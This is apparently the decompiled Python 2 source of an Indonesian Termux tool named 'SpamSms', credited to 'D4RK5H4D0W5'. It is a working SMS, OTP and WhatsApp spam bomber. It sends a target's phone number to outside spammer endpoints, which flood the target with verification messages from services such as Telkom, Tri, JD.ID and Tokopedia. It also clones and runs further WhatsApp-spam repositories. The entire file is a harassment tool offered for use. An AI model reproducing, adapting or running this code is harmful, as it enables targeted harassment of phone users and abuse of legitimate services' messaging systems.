# uncompyle6 version 3.6.2
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.17 (default, Oct 23 2019, 08:25:46) 
# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
# Embedded file name: <script>
# Compiled at: 2018-02-25 13:25:47
from getpass import getpass
import urllib, urllib2, os, time, sys, requests, random
G0 = '\x1b[0;32m'
G1 = '\x1b[1;32m'
C0 = '\x1b[0;36m'
C1 = '\x1b[1;36m'
P0 = '\x1b[0;35m'
P1 = '\x1b[1;35m'
W0 = '\x1b[0;37m'
W1 = '\x1b[1;37m'
B0 = '\x1b[0;34m'
B1 = '\x1b[1;34m'
R0 = '\x1b[0;31m'
R1 = '\x1b[1;31m'
BG = '\x1b[1;97;41m'
RE = '\x1b[0m'
r = '\x1b[91m'
c = '\x1b[96m'
w = '\x1b[0m'

def metu():
    print '%s[%sx%s] %sExiting Program' % (W0, R1, W0, R0)
    exit(1)


def koneksi():
    logo()
    print '%s[%s+%s] %sMemeriksa koneksi internet ...' % (W1, P1, W1, W0)
    try:
        rq = requests.get('http://github.com')
        print '%s[%s+%s] %sKoneksi bagus ...' % (W1, G1, W1, G0)
        time.sleep(1)
    except requests.exceptions.ConnectionError:
        print '%s[%sx%s] %sTidak ada koneksi ...' % (W1, R1, W1, R0)
        time.sleep(1)
        metu()


def telkom():
    c = 0
    values = {'nomer': raw_input('\x1b[1;37m[\x1b[1;32m?\x1b[1;37m] \x1b[0;37mNomor (Only telkom) : '), 'jumlah': '15', 'input': 'submit'}
    count = raw_input('\x1b[1;37m[\x1b[1;35m?\x1b[1;37m] \x1b[0;37mJumlah (Maks 10) : ')
    if count >= '11':
        print '%s[%s!%s] %sGoblok !' % (W1, R1, W1, R0)
        metu()
    elif count <= '10':
        url = 'https://hexsploit.web.id/telkombomb2'
        data = urllib.urlencode(values)
        req = urllib2.Request(url, data)
        response = urllib2.urlopen(req)
        html = response.read()
        while c < int(count):
            c += 1
            print '%s[%s%s%s] %sSukses Spam' % (W1, C1, c, W1, G0)
            time.sleep(1)

        raw_input('\n\x1b[0;37m[!] Tekan enter untuk back ')
        inp()


def tri():
    c = 0
    values = {'nomer': raw_input('\x1b[1;37m[\x1b[1;32m?\x1b[1;37m] \x1b[0;37mNomor (08xxx) : '), 'jumlah': '15', 'input': 'submit'}
    count = raw_input('\x1b[1;37m[\x1b[1;35m?\x1b[1;37m] \x1b[0;37mJumlah (Maks 10) : ')
    if count >= '11':
        print '%s[%s!%s] %sGoblok !' % (W1, R1, W1, R0)
        metu()
    elif count <= '10':
        url = 'https://www.hexsploit.web.id/spam-tri.php'
        data = urllib.urlencode(values)
        req = urllib2.Request(url, data)
        response = urllib2.urlopen(req)
        html = response.read()
        while c < int(count):
            c += 1
            print '%s[%s%s%s] %sSukses Spam' % (W1, C1, c, W1, G0)
            time.sleep(1)

        raw_input('\n\x1b[0;37m[!] Tekan enter untuk back ')
        inp()


def cash3():
    c = 0
    values = {'nomer': raw_input('\x1b[1;37m[\x1b[1;32m?\x1b[1;37m] \x1b[0;37mNomor (08xxx) : '), 'jumlah': '15', 'input': 'submit'}
    count = raw_input('\x1b[1;37m[\x1b[1;35m?\x1b[1;37m] \x1b[0;37mJumlah (Maks 3) : ')
    if count >= '4':
        print '%s[%s!%s] %sGoblok !' % (W1, R1, W1, R0)
        metu()
    elif count <= '3':
        url = 'https://www.hexsploit.web.id/cashtree.php'
        data = urllib.urlencode(values)
        req = urllib2.Request(url, data)
        response = urllib2.urlopen(req)
        html = response.read()
        while c < int(count):
            c += 1
            print '%s[%s%s%s] %sSukses Spam' % (W1, C1, c, W1, G0)
            time.sleep(1)

        raw_input('\n\x1b[0;37m[!] Tekan enter untuk back ')
        inp()


def jdid():
    c = 0
    values = {'no': raw_input('\x1b[1;37m[\x1b[1;32m?\x1b[1;37m] \x1b[0;37mNomor (8xxx) : '), 'jum': '15', 'jed': '2', 'input': 'submit'}
    count = raw_input('\x1b[1;37m[\x1b[1;35m?\x1b[1;37m] \x1b[0;37mJumlah (Maks 10) : ')
    if count >= '11':
        print '%s[%s!%s] %sGoblok !' % (W1, R1, W1, R0)
        metu()
    elif count <= '10':
        url = 'https://tools.w3llsquadofficial.org/spammer.php?sp=jdid'
        data = urllib.urlencode(values)
        req = urllib2.Request(url, data)
        response = urllib2.urlopen(req)
        html = response.read()
        while c < int(count):
            c += 1
            print '%s[%s%s%s] %sSukses Spam' % (W1, C1, c, W1, G0)
            time.sleep(1)

        raw_input('\n\x1b[0;37m[!] Tekan enter untuk back ')
        inp()


def phd():
    c = 0
    values = {'no': raw_input('\x1b[1;37m[\x1b[1;32m?\x1b[1;37m] \x1b[0;37mNomor (628xxx) : '), 'jum': '15', 'jed': '1', 'input': 'submit'}
    count = raw_input('\x1b[1;37m[\x1b[1;35m?\x1b[1;37m] \x1b[0;37mJumlah (Maks 10) : ')
    if count >= '11':
        print '%s[%s!%s] %sGoblok !' % (W1, R1, W1, R0)
        metu()
    elif count <= '10':
        url = 'https://tools.w3llsquadofficial.org/spammer.php?sp=phd'
        data = urllib.urlencode(values)
        req = urllib2.Request(url, data)
        response = urllib2.urlopen(req)
        html = response.read()
        while c < int(count):
            c += 1
            print '%s[%s%s%s] %sSukses Spam' % (W1, C1, c, W1, G0)
            time.sleep(1)

        raw_input('\n\x1b[0;37m[!] Tekan enter untuk back ')
        inp()


def indomart():
    c = 0
    values = {'no': raw_input('\x1b[1;37m[\x1b[1;32m?\x1b[1;37m] \x1b[0;37mNomor (08xxx) : '), 'jum': '15', 'jed': '1', 'input': 'submit'}
    count = raw_input('\x1b[1;37m[\x1b[1;35m?\x1b[1;37m] \x1b[0;37mJumlah (Maks 10) : ')
    if count >= '11':
        print '%s[%s!%s] %sGoblok !' % (W1, R1, W1, R0)
        metu()
    elif count <= '10':
        url = 'https://tools.w3llsquadofficial.org/spammer.php?sp=indomart'
        data = urllib.urlencode(values)
        req = urllib2.Request(url, data)
        response = urllib2.urlopen(req)
        html = response.read()
        while c < int(count):
            c += 1
            print '%s[%s%s%s] %sSukses Spam' % (W1, C1, c, W1, G0)
            time.sleep(1)

        raw_input('\n\x1b[0;37m[!] Tekan enter untuk back ')
        inp()


def m_aladin():
    c = 0
    values = {'no': raw_input('\x1b[1;37m[\x1b[1;32m?\x1b[1;37m] \x1b[0;37mNomor (8xxx) : '), 'jum': '15', 'jed': '1', 'input': 'submit'}
    count = raw_input('\x1b[1;37m[\x1b[1;35m?\x1b[1;37m] \x1b[0;37mJumlah (Maks 10) : ')
    if count >= '11':
        print '%s[%s!%s] %sGoblok !' % (W1, R1, W1, R0)
        metu()
    elif count <= '10':
        url = 'https://tools.w3llsquadofficial.org/spammer.php?sp=mister_aladin'
        data = urllib.urlencode(values)
        req = urllib2.Request(url, data)
        response = urllib2.urlopen(req)
        html = response.read()
        while c < int(count):
            c += 1
            print '%s[%s%s%s] %sSukses Spam' % (W1, C1, c, W1, G0)
            time.sleep(1)

        raw_input('\n\x1b[0;37m[!] Tekan enter untuk back ')
        inp()


def logo():
    os.system('clear')
    print '%s\n _______                        _______\n|     __|.-----.---.-.--------.|     __|.--------.-----.\n|__     ||  _  |  _  |        ||__     ||        |__ --|\n|_______||   __|___._|__|__|__||_______||__|__|__|_____|\n         |__|  %sTools ini bisa down kapan saja %s\n' % (G1, W0, G1)


def ct():
    logo()
    print '%s[%s1%s] %sHajar\n%s[%s2%s] %sContact (Whatsapp)\n%s[%s3%s] %sInstall Bahan dulu\n%s[%s0%s] %sExit' % (W1, C1, W1, W0, W1, C1, W1, W0, W1, C1, W1, W0, W1, R1, W1, R0)
    su = ['1', '2', '3', '0']
    wa = raw_input('%s\n\xe2\x95\x94>%s[%sD4RK5H4D0W5%s]\n%s\xe2\x95\x9a%s[%sPilih%s]> %s' % (C1, W1, P1, W1, C1, W1, P1, W1, W0))
    while wa not in su:
        logo()
        print '%s[%s1%s] %sHajar\n%s[%s2%s] %sContact (Whatsapp)\n%s[%s3%s] %sInstall Bahan dulu\n%s[%s0%s] %sExit' % (W1, C1, W1, W0, W1, C1, W1, W0, W1, C1, W1, W0, W1, R1, W1, R0)
        print '\n%s[%sx%s] %sPilihan Anda salah' % (W0, R0, W0, R0)
        wa = raw_input('%s\xe2\x95\x94>%s[%sD4RK5H4D0W5%s]\n%s\xe2\x95\x9a%s[%sPilih%s]> %s' % (C1, W1, P1, W1, C1, W1, P1, W1, W0))

    if wa == '1':
        inp()
    elif wa == '2':
        logo()
        print '%s[%s!%s] %sWaiting ...' % (W0, R1, W0, W0)
        os.system('xdg-open https://wa.me/628996604524?text=Assalamualaikum%20gan%20passwordnya%20Sc%20IXID%20apa?')
        exit(1)
    elif wa == '3':
        logo()
        koneksi()
        print '%s[%s+%s] %sWaiting ...' % (W0, P1, W0, R0)
        os.system('pkg update && pkg upgrade; pkg install python; pkg install grep; pkg install curl; pkg install ruby; gem install lolcat; pip2 install requests; pip2 install urllib2')
        os.system('git clone https://github.com/Rusmana-ID/spam-whatsapp-unli')
        os.system('git clone https://github.com/Rusmana-ID/spam-notify-id')
        os.system('git clone https://github.com/Fukur0-3XP/SpamWa')
        os.system('rm -rf spam-wa2')
        print '%s[%s\xc3\x97%s] %sSelesai' % (W0, R1, W0, W0)
        time.sleep(2)
        ct()
    elif wa == '0':
        print ''
        metu()


def menu():
    print '%s{%s01%s} %sSpam JDID\n%s{%s02%s} %sSpam PHD\n%s{%s03%s} %sSpam Indomart\n%s{%s04%s} %sSpam Mister Aladin\n%s{%s05%s} %sSpam Tri\n%s{%s06%s} %sSpam Cashtree\n%s{%s07%s} %sSpam Codapay\n%s{%s08%s} %sSpam Telkom\n%s{%s09%s} %sSpam Sms Unlimited\n%s{%s10%s} %sSpam WA kitabisa\n%s{%s11%s} %sSpam WA Tokped\n%s{%s12%s} %sUpdate\n%s{%s13%s} %sInfo Tools\n%s{%s00%s} %sExit' % (W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, W0, W0, G1, W0, R0)


def inp():
    logo()
    menu()
    try:
        no = [
         '1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '01', '02', '03', '04', '05', '06', '07', '08', '09', '00', '0']
        pilih = raw_input('\n%s\xe2\x95\x94>%s[%sD4RK5H4D0W5%s]\n%s\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90%s[%sPilih%s]> %s' % (C1, W1, P1, W1, C1, W1, P1, W1, W0))
        while pilih not in no:
            logo()
            menu()
            print '\n%s[%sx%s] %sPilihan Anda salah' % (W0, R1, W0, R0)
            pilih = raw_input('%s\xe2\x95\x94>%s[%sD4RK5H4D0W5%s]\n%s\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90%s[%sPilih%s]> %s' % (C1, W1, P1, W1, C1, W1, P1, W1, W0))

        if pilih == '1' or pilih == '01':
            logo()
            koneksi()
            jdid()
        elif pilih == '2' or pilih == '02':
            logo()
            koneksi()
            phd()
        elif pilih == '3' or pilih == '03':
            logo()
            koneksi()
            indomart()
        elif pilih == '4' or pilih == '04':
            logo()
            koneksi()
            m_aladin()
        elif pilih == '5' or pilih == '05':
            logo()
            koneksi()
            tri()
        elif pilih == '6' or pilih == '06':
            logo()
            koneksi()
            cash3()
        elif pilih == '7' or pilih == '07':
            logo()
            koneksi()
            os.system('xdg-open https://revan.mohona.tv')
            exit()
        elif pilih == '8' or pilih == '08':
            logo()
            koneksi()
            telkom()
        elif pilih == '9' or pilih == '09':
            logo()
            koneksi()
            os.system('cd spam-notify-id; bash spam.sh')
            exit()
        elif pilih == '11':
            logo()
            koneksi()
            os.system('cd SpamWa; python2 Wa.py')
            exit()
        elif pilih == '10':
            logo()
            koneksi()
            os.system('cd spam-whatsapp-unli; sh spam-wa.sh')
            exit()
        elif pilih == '12':
            logo()
            koneksi()
            os.system('git pull')
            print '%s[%s+%s] %sTools was updated. \xc2\xaf\\_(\xe3\x83\x84)_/\xc2\xaf' % (W1, P1, W1, W0)
            exit()
        elif pilih == '13':
            logo()
            print '%sAuthor  : D4RK5H4D0W5\nThx to   : Allah \n                Official Offensive Security Ghost' % W0
            exit(1)
        elif pilih == '0' or pilih == '00':
            print ''
            metu()
    except KeyboardInterrupt:
        print ''
        metu()


if __name__ == '__main__':
    logo()
    menu()
    ct()
    inp()
    jdid()
    phd()
    indomart()
    m_aladin()
    tri()
    cash3()
    telkom()
    koneksi()
    metu()
# okay decompiling sp.pyc
